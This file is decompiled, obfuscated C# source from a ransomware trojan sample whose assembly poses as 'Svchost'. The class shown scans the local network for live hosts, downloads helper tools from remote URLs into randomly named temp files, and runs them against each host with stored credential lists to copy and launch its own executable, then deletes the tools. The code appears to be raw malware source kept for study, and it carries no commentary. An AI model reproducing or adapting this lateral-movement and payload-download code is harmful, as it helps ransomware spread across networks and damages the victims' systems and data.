// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.TaboJirPIvtr
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using SmartAssembly.Delegates;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace qYAjLWajCJpnf
{
  internal sealed class TaboJirPIvtr
  {
    public static List<string> btMtYLfqEoNw;
    public static string NGtRmYhZiJq;
    public static List<string> UnGdqvmVPIRw;
    public static List<string> gJavkmIzpcRQ;
    public static List<string> izLQJUNlsoC;
    public List<string> fzYBHyuzVxhJ = new List<string>();
    public List<string> rklOCXcKUKGBO = new List<string>();
    public List<string> WaAwWUJVVqrVCj = new List<string>();
    [NonSerialized]
    internal static GetString \u000F;

    public static void IetYuyAZDkh()
    {
      Action<string> action = (Action<string>) null;
      TaboJirPIvtr.BtMEEwwBtLz btMeEwwBtLz = new TaboJirPIvtr.BtMEEwwBtLz();
      bTJSgdVkQM.OuwslfEqACx();
      List<TxBKgQVchDeTS> txBkgQvchDeTsList = TxBKgQVchDeTS.QnpHqmCNtB();
      foreach (TxBKgQVchDeTS txBkgQvchDeTs in txBkgQvchDeTsList)
        TaboJirPIvtr.btMtYLfqEoNw.Add(txBkgQvchDeTs.get_IPAddress());
      if (bTJSgdVkQM.qvPWtnGDFercawvHYD.Count > 0)
        TaboJirPIvtr.btMtYLfqEoNw = TaboJirPIvtr.btMtYLfqEoNw.Union<string>((IEnumerable<string>) bTJSgdVkQM.qvPWtnGDFercawvHYD).ToList<string>();
      btMeEwwBtLz.UZokWbXhxaGNDr = TaboJirPIvtr.\u000F(107350580);
      btMeEwwBtLz.FQwmqyTwZN = TaboJirPIvtr.\u000F(107350580);
      try
      {
        btMeEwwBtLz.UZokWbXhxaGNDr = TaboJirPIvtr.axWXvwdAJqejX();
      }
      catch
      {
      }
      try
      {
        btMeEwwBtLz.FQwmqyTwZN = TaboJirPIvtr.SbDGbksWSiAW();
      }
      catch
      {
      }
      foreach (TxBKgQVchDeTS txBkgQvchDeTs in txBkgQvchDeTsList)
      {
        try
        {
          if (!txBkgQvchDeTs.get_IPAddress().StartsWith(TaboJirPIvtr.\u000F(107377911)) && !txBkgQvchDeTs.get_IPAddress().StartsWith(TaboJirPIvtr.\u000F(107377906)) && !txBkgQvchDeTs.get_IPAddress().StartsWith(TaboJirPIvtr.\u000F(107377865)))
          {
            if (!txBkgQvchDeTs.get_IPAddress().Contains(TaboJirPIvtr.\u000F(107377884)))
              continue;
          }
          UgWbNbXiAr.DFKdxLDXAiHMP(txBkgQvchDeTs.get_MacAddress(), txBkgQvchDeTs.get_IPAddress(), TaboJirPIvtr.\u000F(107459361));
        }
        catch
        {
        }
      }
      try
      {
        List<string> btMtYlfqEoNw = TaboJirPIvtr.btMtYLfqEoNw;
        if (action == null)
          action = new Action<string>(btMeEwwBtLz.\u003CRun\u003Eb__d);
        Action<string> body = action;
        Parallel.ForEach<string>((IEnumerable<string>) btMtYlfqEoNw, body);
      }
      catch
      {
        return;
      }
      try
      {
        if (System.IO.File.Exists(btMeEwwBtLz.UZokWbXhxaGNDr))
          System.IO.File.Delete(btMeEwwBtLz.UZokWbXhxaGNDr);
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (!System.IO.File.Exists(btMeEwwBtLz.FQwmqyTwZN))
          return;
        System.IO.File.Delete(btMeEwwBtLz.FQwmqyTwZN);
      }
      catch (Exception ex)
      {
      }
    }

    public static string axWXvwdAJqejX() => IntPtr.Size != 8 ? TaboJirPIvtr.qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(TaboJirPIvtr.\u000F(107459340)))) : TaboJirPIvtr.qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(TaboJirPIvtr.\u000F(107459340))));

    public static string SbDGbksWSiAW() => IntPtr.Size != 8 ? TaboJirPIvtr.qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(TaboJirPIvtr.\u000F(107459726)))) : TaboJirPIvtr.qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(TaboJirPIvtr.\u000F(107459291))));

    public static bool yThKTqJWNfEEXwD([In] string obj0)
    {
      bool flag = false;
      Ping ping = (Ping) null;
      try
      {
        using (ping = new Ping())
          flag = ping.Send(obj0).Status == IPStatus.Success;
      }
      catch (PingException ex)
      {
      }
      finally
      {
        ping?.Dispose();
      }
      return flag;
    }

    public static string qQNHIfyNpMA([In] Uri obj0)
    {
      string path2 = Path.GetRandomFileName().Replace(TaboJirPIvtr.\u000F(107459621), TaboJirPIvtr.\u000F(107350580)).Remove(0, 3) + TaboJirPIvtr.\u000F(107459616);
      new WebClient().DownloadFile(obj0, Path.Combine(Path.GetTempPath(), path2));
      return Path.Combine(Path.GetTempPath(), path2);
    }

    static TaboJirPIvtr()
    {
      SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (TaboJirPIvtr));
      TaboJirPIvtr.btMtYLfqEoNw = new List<string>();
      TaboJirPIvtr.NGtRmYhZiJq = TaboJirPIvtr.\u000F(107350580);
      TaboJirPIvtr.UnGdqvmVPIRw = new List<string>();
      TaboJirPIvtr.gJavkmIzpcRQ = new List<string>();
      TaboJirPIvtr.izLQJUNlsoC = new List<string>();
    }

    private sealed class BtMEEwwBtLz
    {
      public string UZokWbXhxaGNDr;
      public string FQwmqyTwZN;
      [NonSerialized]
      internal static GetString \u001A;

      public void \u003CRun\u003Eb__d([In] string obj0)
      {
        if (!obj0.StartsWith(TaboJirPIvtr.BtMEEwwBtLz.\u001A(107377914)) && !obj0.StartsWith(TaboJirPIvtr.BtMEEwwBtLz.\u001A(107377909)) && !obj0.StartsWith(TaboJirPIvtr.BtMEEwwBtLz.\u001A(107377868)) && !obj0.Contains(TaboJirPIvtr.BtMEEwwBtLz.\u001A(107377887)) || !TaboJirPIvtr.yThKTqJWNfEEXwD(obj0))
          return;
        if (bTJSgdVkQM.FtfEHcuGYoigQT == TaboJirPIvtr.BtMEEwwBtLz.\u001A(107396975))
        {
          for (int index = 0; index < TaboJirPIvtr.UnGdqvmVPIRw.Count; ++index)
          {
            if (bTJSgdVkQM.ZDbHiLoVEkHSf)
            {
              if (System.IO.File.Exists(this.UZokWbXhxaGNDr))
                bTJSgdVkQM.sroZTJGCRhFP(this.UZokWbXhxaGNDr, TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348845) + obj0 + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459642) + TaboJirPIvtr.UnGdqvmVPIRw[index] + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459633) + TaboJirPIvtr.gJavkmIzpcRQ[index] + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459592) + Assembly.GetEntryAssembly().Location + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348863));
            }
            else if (System.IO.File.Exists(this.FQwmqyTwZN))
              bTJSgdVkQM.sroZTJGCRhFP(this.FQwmqyTwZN, TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348845) + obj0 + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459642) + TaboJirPIvtr.UnGdqvmVPIRw[index] + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459633) + TaboJirPIvtr.gJavkmIzpcRQ[index] + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459559) + Assembly.GetEntryAssembly().Location + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348863));
          }
        }
        else if (bTJSgdVkQM.ZDbHiLoVEkHSf)
        {
          if (!System.IO.File.Exists(this.UZokWbXhxaGNDr))
            return;
          bTJSgdVkQM.sroZTJGCRhFP(this.UZokWbXhxaGNDr, TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348845) + obj0 + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107459502) + Assembly.GetEntryAssembly().Location + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348863));
        }
        else
        {
          if (!System.IO.File.Exists(this.FQwmqyTwZN))
            return;
          bTJSgdVkQM.sroZTJGCRhFP(this.FQwmqyTwZN, TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348845) + obj0 + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107458957) + Assembly.GetEntryAssembly().Location + TaboJirPIvtr.BtMEEwwBtLz.\u001A(107348863));
        }
      }

      static BtMEEwwBtLz() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (TaboJirPIvtr.BtMEEwwBtLz));
    }
  }
}
